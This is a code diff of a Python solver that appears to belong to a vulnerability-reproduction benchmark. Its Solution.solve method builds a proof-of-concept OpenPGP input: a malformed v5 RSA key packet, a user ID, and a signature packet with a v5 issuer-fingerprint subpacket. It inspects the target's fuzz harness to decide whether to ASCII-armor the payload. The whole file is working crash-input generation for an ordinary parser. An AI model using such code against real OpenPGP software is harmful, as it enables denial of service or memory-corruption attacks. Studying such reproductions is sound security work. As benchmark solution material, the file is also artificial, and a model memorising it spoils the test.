@@ -1,62 +1,11 @@
 import os
-import io
 import re
 import tarfile
 import base64
-from typing import Iterable, Optional
+from typing import Optional, Iterable, Tuple
 
 
-def _encode_new_format_length(n: int) -> bytes:
-    if n < 0:
-        raise ValueError("negative length")
-    if n < 192:
-        return bytes([n])
-    if n < 8384:
-        n2 = n - 192
-        return bytes([192 + (n2 >> 8), n2 & 0xFF])
-    return bytes([255]) + n.to_bytes(4, "big")
-
-
-def _pgp_packet(tag: int, body: bytes) -> bytes:
-    if not (0 <= tag <= 63):
-        raise ValueError("tag out of range")
-    hdr = bytes([0xC0 | tag]) + _encode_new_format_length(len(body))
-    return hdr + body
-
-
-def _mpi_from_int_bytes(x: bytes) -> bytes:
-    x = x.lstrip(b"\x00") or b"\x00"
-    bitlen = (len(x) - 1) * 8 + (x[0].bit_length() if x else 0)
-    return bitlen.to_bytes(2, "big") + x
-
-
-def _build_v5_rsa_public_key_packet(tag: int, nbits: int = 2048, t: int = 0) -> bytes:
-    if nbits < 64:
-        nbits = 64
-    nbytes = (nbits + 7) // 8
-    first = 1 << ((nbits - 1) % 8)
-    modulus = bytes([first]) + b"\xAA" * (nbytes - 1)
-    exponent = b"\x01\x00\x01"  # 65537
-
-    mpi_n = _mpi_from_int_bytes(modulus)
-    mpi_e = _mpi_from_int_bytes(exponent)
-    key_material = mpi_n + mpi_e
-
-    body = bytearray()
-    body.append(5)  # version
-    body += int(t).to_bytes(4, "big", signed=False)
-    body.append(1)  # RSA
-    body += len(key_material).to_bytes(4, "big", signed=False)
-    body += key_material
-    return _pgp_packet(tag, bytes(body))
-
-
-def _build_userid_packet(userid: str) -> bytes:
-    b = userid.encode("utf-8", errors="strict")
-    return _pgp_packet(13, b)
-
-
-def _crc24_openpgp(data: bytes) -> int:
+def _crc24(data: bytes) -> int:
     crc = 0xB704CE
     poly = 0x1864CFB
     for b in data:
@@ -68,118 +17,186 @@ def _crc24_openpgp(data: bytes) -> int:
     return crc & 0xFFFFFF
 
 
-def _armor_public_key(binary: bytes) -> bytes:
-    b64 = base64.b64encode(binary).decode("ascii")
-    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
-    crc = _crc24_openpgp(binary)
-    crc_b64 = base64.b64encode(crc.to_bytes(3, "big")).decode("ascii")
+def _armor(data: bytes, kind: str = "PGP PUBLIC KEY BLOCK") -> bytes:
+    b64 = base64.b64encode(data).decode("ascii")
+    lines = [b64[i : i + 64] for i in range(0, len(b64), 64)]
+    crc = _crc24(data)
+    crc_bytes = bytes([(crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])
+    crc_b64 = base64.b64encode(crc_bytes).decode("ascii")
     out = []
-    out.append("-----BEGIN PGP PUBLIC KEY BLOCK-----\n")
+    out.append(f"-----BEGIN {kind}-----\n")
     out.append("\n")
-    for ln in lines:
-        out.append(ln + "\n")
+    out.extend([ln + "\n" for ln in lines])
     out.append("=" + crc_b64 + "\n")
-    out.append("-----END PGP PUBLIC KEY BLOCK-----\n")
-    return "".join(out).encode("ascii")
+    out.append(f"-----END {kind}-----\n")
+    return "".join(out).encode("utf-8")
 
 
-def _iter_source_text_files_from_dir(root: str) -> Iterable[tuple[str, bytes]]:
-    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".rs", ".go", ".java", ".kt", ".m", ".mm"}
-    for dirpath, _, filenames in os.walk(root):
-        for fn in filenames:
-            _, ext = os.path.splitext(fn)
-            if ext.lower() not in exts:
+def _pgp_len(n: int) -> bytes:
+    if n < 192:
+        return bytes([n])
+    if n < 8384:
+        n2 = n - 192
+        return bytes([(n2 >> 8) + 192, n2 & 0xFF])
+    return b"\xFF" + n.to_bytes(4, "big", signed=False)
+
+
+def _pgp_pkt(tag: int, body: bytes) -> bytes:
+    return bytes([0xC0 | (tag & 0x3F)]) + _pgp_len(len(body)) + body
+
+
+def _mpi_from_int(v: int) -> bytes:
+    if v == 0:
+        return b"\x00\x00"
+    bl = v.bit_length()
+    b = v.to_bytes((bl + 7) // 8, "big")
+    return bl.to_bytes(2, "big") + b
+
+
+def _make_openpgp_poc_binary() -> bytes:
+    fp32 = bytes(range(1, 33))
+
+    issuer_fp_subpkt = bytes([34, 33, 5]) + fp32  # len=34 (type+data), type=33, keyver=5, fp=32 bytes
+    sig_body = bytearray()
+    sig_body += b"\x04"  # version
+    sig_body += b"\x13"  # sig type (positive certification)
+    sig_body += b"\x01"  # pkalgo (RSA)
+    sig_body += b"\x08"  # hashalgo (SHA256)
+    sig_body += (0).to_bytes(2, "big")  # hashed subpackets len
+    sig_body += len(issuer_fp_subpkt).to_bytes(2, "big")  # unhashed subpackets len
+    sig_body += issuer_fp_subpkt
+    sig_body += b"\x00\x00"  # left16
+    sig_body += _mpi_from_int(1)  # dummy RSA signature MPI
+
+    sig_pkt = _pgp_pkt(2, bytes(sig_body))
+
+    n_mpi = _mpi_from_int(1)
+    e_mpi = _mpi_from_int(1)
+    keymat = n_mpi + e_mpi
+    pub_body = bytearray()
+    pub_body += b"\x05"  # v5
+    pub_body += (0).to_bytes(4, "big")  # created
+    pub_body += b"\x01"  # RSA
+    pub_body += len(keymat).to_bytes(4, "big")  # key material octet count (v5)
+    pub_body += keymat
+    pub_pkt = _pgp_pkt(6, bytes(pub_body))
+
+    uid_pkt = _pgp_pkt(13, b"a")
+
+    return pub_pkt + uid_pkt + sig_pkt
+
+
+def _iter_source_files_from_tar(tf: tarfile.TarFile) -> Iterable[Tuple[str, bytes]]:
+    for m in tf.getmembers():
+        if not m.isfile():
+            continue
+        name = m.name
+        low = name.lower()
+        if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".cxx") or low.endswith(".h") or low.endswith(".hpp")):
+            continue
+        if m.size <= 0 or m.size > 2_000_000:
+            continue
+        f = tf.extractfile(m)
+        if not f:
+            continue
+        try:
+            data = f.read()
+        except Exception:
+            continue
+        yield name, data
+
+
+def _iter_source_files_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
+    for dp, _, fns in os.walk(root):
+        for fn in fns:
+            low = fn.lower()
+            if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".cxx") or low.endswith(".h") or low.endswith(".hpp")):
                 continue
-            p = os.path.join(dirpath, fn)
+            path = os.path.join(dp, fn)
             try:
-                st = os.stat(p)
+                st = os.stat(path)
             except OSError:
                 continue
             if st.st_size <= 0 or st.st_size > 2_000_000:
                 continue
             try:
-                with open(p, "rb") as f:
-                    yield p, f.read()
-            except OSError:
-                continue
-
-
-def _iter_source_text_files_from_tar(tar_path: str) -> Iterable[tuple[str, bytes]]:
-    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".rs", ".go", ".java", ".kt", ".m", ".mm"}
-    with tarfile.open(tar_path, "r:*") as tf:
-        for m in tf.getmembers():
-            if not m.isfile():
-                continue
-            name = m.name
-            _, ext = os.path.splitext(name)
-            if ext.lower() not in exts:
-                continue
-            if m.size <= 0 or m.size > 2_000_000:
-                continue
-            f = tf.extractfile(m)
-            if f is None:
-                continue
-            try:
-                data = f.read()
+                with open(path, "rb") as f:
+                    data = f.read()
             except Exception:
                 continue
-            yield name, data
+            rel = os.path.relpath(path, root)
+            yield rel, data
 
 
-def _detect_prefer_armored(src_path: str) -> bool:
-    def looks_like_fuzz_file(path: str, text: str) -> bool:
-        p = path.lower()
-        if "fuzz" in p or "fuzzer" in p or "oss-fuzz" in p:
-            return True
-        if "llvmfuzzertestoneinput" in text:
-            return True
-        return False
-
+def _detect_prefers_armor(source_blobs: Iterable[bytes]) -> bool:
     armor_score = 0
-    binary_score = 0
-
-    it = None
-    if os.path.isdir(src_path):
-        it = _iter_source_text_files_from_dir(src_path)
-    elif os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
-        it = _iter_source_text_files_from_tar(src_path)
-
-    if it is None:
-        return False
-
-    for path, data in it:
-        if not data:
+    bin_score = 0
+    for b in source_blobs:
+        try:
+            s = b.decode("utf-8", errors="ignore")
+        except Exception:
             continue
-        text = data[:300_000].decode("utf-8", errors="ignore").lower()
-        if not looks_like_fuzz_file(path, text):
-            continue
+        sl = s.lower()
+        if "llvmfuzzertestoneinput" in sl:
+            if "begin pgp" in sl or "-----begin pgp" in sl:
+                armor_score += 4
+            if "armor" in sl or "armored" in sl or "dearmor" in sl or "unarmor" in sl:
+                armor_score += 3
+            if "base64" in sl:
+                armor_score += 1
+            if "readpkt" in sl or "parsepkt" in sl or "parse_pkts" in sl or "parsepkts" in sl:
+                bin_score += 1
+            if "fread" in sl or "stdin" in sl:
+                bin_score += 1
+        else:
+            if "-----begin pgp" in sl:
+                armor_score += 1
+    return armor_score > bin_score
 
-        if "llvmfuzzertestoneinput" in text:
-            binary_score += 2
 
-        if "-----begin pgp" in text or "begin pgp public key block" in text:
-            armor_score += 4
-        if re.search(r"\bdearmor\b", text) or re.search(r"\barmou?r(ed|)\b", text) or re.search(r"\bradix-64\b", text):
-            armor_score += 2
-        if re.search(r"\bparse_armor\b", text) or re.search(r"\bparsearm(or|ou?r)\b", text):
-            armor_score += 2
-
-        if re.search(r"\bparse_packets?\b", text) or re.search(r"\bload_keys?\b", text) or re.search(r"\bopenpgp\b", text):
-            binary_score += 1
-
-        if armor_score >= 6:
-            return True
-
-    return armor_score > binary_score + 2
+def _gather_fuzzer_sources(source_iter: Iterable[Tuple[str, bytes]]) -> Tuple[bool, list]:
+    fuzz_blobs = []
+    for name, data in source_iter:
+        if b"LLVMFuzzerTestOneInput" in data:
+            fuzz_blobs.append(data)
+    return (len(fuzz_blobs) > 0), fuzz_blobs
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        primary = _build_v5_rsa_public_key_packet(tag=6, nbits=2048, t=0)
-        uid = _build_userid_packet("a")
-        subkey = _build_v5_rsa_public_key_packet(tag=14, nbits=2048, t=0)
-        poc_bin = primary + uid + subkey
+        poc_bin = _make_openpgp_poc_binary()
 
-        if _detect_prefer_armored(src_path):
-            return _armor_public_key(poc_bin)
+        prefer_armor = False
+        if os.path.isdir(src_path):
+            _, fuzz_blobs = _gather_fuzzer_sources(_iter_source_files_from_dir(src_path))
+            if fuzz_blobs:
+                prefer_armor = _detect_prefers_armor(fuzz_blobs)
+            else:
+                # fallback: scan a few non-fuzzer sources for armor hints
+                sample = []
+                for _, data in _iter_source_files_from_dir(src_path):
+                    sample.append(data)
+                    if len(sample) >= 20:
+                        break
+                if sample:
+                    prefer_armor = _detect_prefers_armor(sample)
+        else:
+            try:
+                with tarfile.open(src_path, "r:*") as tf:
+                    _, fuzz_blobs = _gather_fuzzer_sources(_iter_source_files_from_tar(tf))
+                    if fuzz_blobs:
+                        prefer_armor = _detect_prefers_armor(fuzz_blobs)
+                    else:
+                        sample = []
+                        for _, data in _iter_source_files_from_tar(tf):
+                            sample.append(data)
+                            if len(sample) >= 20:
+                                break
+                        if sample:
+                            prefer_armor = _detect_prefers_armor(sample)
+            except Exception:
+                prefer_armor = False
+
+        if prefer_armor:
+            return _armor(poc_bin, "PGP PUBLIC KEY BLOCK")
         return poc_bin
